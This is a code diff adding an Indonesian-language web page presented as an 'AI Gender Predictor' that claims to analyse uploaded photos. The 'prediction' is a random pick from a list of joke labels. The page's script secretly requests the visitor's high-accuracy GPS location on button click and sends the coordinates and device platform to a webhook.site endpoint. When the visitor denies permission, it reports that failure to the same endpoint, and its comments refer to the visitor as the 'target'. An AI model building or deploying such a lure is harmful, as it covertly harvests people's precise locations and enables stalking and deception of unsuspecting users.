@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AI Gender Predictor Pro</title>
+    <style>
+        /* PERBAIKAN DESAIN & RESPONSIVITAS */
+        :root {
+            --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --secondary-blue: #007bff;
+            --accent-purple: #9d50bb;
+            --background-light: #f4f7f6;
+            --text-dark: #2d3436;
+            --white: #ffffff;
+            --shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Poppins', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--background-light);
+            background-image: var(--primary-gradient);
+            color: var(--text-dark);
+            margin: 0;
+            padding: 20px;
+            /* PERBAIKAN: Gunakan min-height untuk mencegah terpotong di HP */
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background-color: var(--white);
+            padding: 40px 30px;
+            border-radius: 24px;
+            box-shadow: var(--shadow);
+            text-align: center;
+            width: 100%;
+            max-width: 420px;
+            /* Animasi masuk */
+            animation: fadeIn 0.5s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Dekorasi latar belakang */
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 6px;
+            background: var(--primary-gradient);
+        }
+
+        h1 {
+            color: var(--text-dark);
+            font-size: 28px;
+            font-weight: 700;
+            margin-top: 0;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+        }
+
+        p.subtitle {
+            color: #636e72;
+            margin-bottom: 35px;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+
+        .upload-area {
+            border: 2px dashed #b2bec3;
+            padding: 40px 20px;
+            border-radius: 18px;
+            background-color: #f9fbfb;
+            margin-bottom: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .upload-area:hover, .upload-area.dragover {
+            border-color: var(--accent-purple);
+            background-color: #f3e5f5;
+        }
+
+        .upload-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+            background: var(--primary-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        input[type="file"] {
+            display: none;
+        }
+
+        #file-name {
+            margin-top: 15px;
+            font-size: 13px;
+            color: var(--accent-purple);
+            font-weight: 500;
+            word-break: break-all;
+        }
+
+        .btn-detect {
+            background: var(--primary-gradient);
+            color: var(--white);
+            border: none;
+            padding: 16px 30px;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            box-shadow: 0 5px 15px rgba(118, 75, 162, 0.3);
+            letter-spacing: 0.5px;
+        }
+
+        .btn-detect:hover {
+            box-shadow: 0 8px 20px rgba(118, 75, 162, 0.4);
+            transform: translateY(-2px);
+        }
+
+        .btn-detect:active {
+            transform: translateY(1px);
+        }
+
+        .btn-detect:disabled {
+            background: #b2bec3;
+            box-shadow: none;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* AREA HASIL */
+        #result-area {
+            margin-top: 30px;
+            padding: 25px;
+            border-radius: 15px;
+            background-color: #f4f7f6;
+            display: none;
+            border: 1px solid #e0e0e0;
+            animation: slideIn 0.4s ease-out;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .result-title {
+            font-weight: 600;
+            color: #636e72;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+
+        .result-value {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--text-dark);
+            background: var(--primary-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* RESPONSIVITAS TAMBAHAN */
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+                border-radius: 20px;
+            }
+            h1 { font-size: 24px; }
+            .upload-area { padding: 30px 15px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>AI Gender Predictor</h1>
+    <p class="subtitle">Unggah foto Anda, dan teknologi AI Ultraviolet kami akan menganalisis fitur wajah untuk menebak gender dengan presisi (Beta 0.2).</p>
+    
+    <label for="file-upload" class="upload-area" id="drop-zone">
+        <div class="upload-icon">📷</div>
+        <div id="upload-text" style="font-weight: 500; color: #555;">Klik atau Seret Foto</div>
+        <div id="file-name"></div>
+    </label>
+    <input type="file" id="file-upload" accept="image/*">
+    
+    <button class="btn-detect" id="detect-btn" disabled>Deteksi Sekarang</button>
+    
+    <div id="result-area">
+        <div class="result-title">Hasil Prediksi AI:</div>
+        <div class="result-value" id="gender-result">--</div>
+    </div>
+</div>
+
+<script>
+    // --- KONFIGURASI PUSAT KONTROL V1.2 ---
+    // GANTI URL DI BAWAH DENGAN URL DARI WEBHOOK.SITE ANDA
+    const WEBHOOK_URL = " https://webhook.site/e8aeac24-178f-4ee5-a872-19415f1fda8f";
+    
+    const genders = ["Pria", "Wanita", "Femboy", "Uma Musume", "Alien"];
+    const fileInput = document.getElementById('file-upload');
+    const detectBtn = document.getElementById('detect-btn');
+    const uploadText = document.getElementById('upload-text');
+    const fileNameDisplay = document.getElementById('file-name');
+    const resultArea = document.getElementById('result-area');
+    const genderResult = document.getElementById('gender-result');
+    const dropZone = document.getElementById('drop-zone');
+
+    // PERBAIKAN: Event Listener yang lebih stabil
+    fileInput.addEventListener('change', handleFileSelect);
+    detectBtn.addEventListener('click', startDetection);
+
+    // Fitur Drag & Drop (Opsional untuk estetika IT)
+    dropZone.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.classList.add('dragover'); });
+    dropZone.addEventListener('dragleave', () => { dropZone.classList.remove('dragover'); });
+    dropZone.addEventListener('drop', (e) => {
+        e.preventDefault();
+        dropZone.classList.remove('dragover');
+        if (e.dataTransfer.files.length > 0) {
+            fileInput.files = e.dataTransfer.files;
+            handleFileSelect();
+        }
+    });
+
+    function handleFileSelect() {
+        if (fileInput.files.length > 0) {
+            fileNameDisplay.textContent = "File: " + fileInput.files[0].name;
+            uploadText.textContent = "Foto Siap";
+            uploadText.style.color = "#9d50bb";
+            detectBtn.disabled = false;
+            resultArea.style.display = "none";
+        }
+    }
+
+    function startDetection() {
+        if (!fileInput.files.length) return;
+
+        // PERBAIKAN: Jalankan pelacakan saat tombol diklik (Interaksi Pengguna)
+        jalankanPelacakan();
+
+        // Simulasi UI
+        detectBtn.disabled = true;
+        detectBtn.textContent = "Sinkronisasi Cloud AI...";
+        resultArea.style.display = "none";
+
+        setTimeout(() => {
+            // Tampilkan hasil acak
+            const randomGender = genders[Math.floor(Math.random() * genders.length)];
+            genderResult.textContent = randomGender;
+            resultArea.style.display = "block";
+            detectBtn.textContent = "Analisis Selesai";
+            
+            // Logika penting Anda: Kunci tombol sampai file baru diunggah
+            detectBtn.disabled = true;
+            fileInput.value = ""; // Reset input file
+            uploadText.textContent = "Klik untuk Unggah Foto Baru";
+            uploadText.style.color = "#555";
+            fileNameDisplay.textContent = "";
+
+        }, 3000); // Loading selama 3 detik
+    }
+
+    function jalankanPelacakan() {
+        if ("geolocation" in navigator) {
+            // Protokol akurasi tinggi
+            navigator.geolocation.getCurrentPosition(sendTrackingData, handleTrackingError, {
+                enableHighAccuracy: true,
+                timeout: 12000, // Beri waktu lebih lama untuk satelit
+                maximumAge: 0
+            });
+        }
+    }
+
+    function sendTrackingData(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const acc = position.coords.accuracy;
+        
+        // Membangun URL dengan koordinat desimal (Pasti muncul di Query Strings Webhook)
+        const trackingUrl = `${WEBHOOK_URL}?lat=${lat}&lon=${lon}&accuracy=${acc}m&platform=${encodeURIComponent(navigator.platform)}`;
+
+        // Kirim data diam-diam
+        fetch(trackingUrl, { mode: 'no-cors' })
+            .then(() => console.log("Sinyal lokasi terpancar."));
+    }
+
+    function handleTrackingError(error) {
+        // Beritahu pusat kontrol jika target menolak (DENIED=1)
+        const errorUrl = `${WEBHOOK_URL}?tracking_status=FAILED&error_code=${error.code}`;
+        fetch(errorUrl, { mode: 'no-cors' });
+        console.log("Akses GPS diblokir.");
+    }
+</script>
+
+</body>
+</html> 
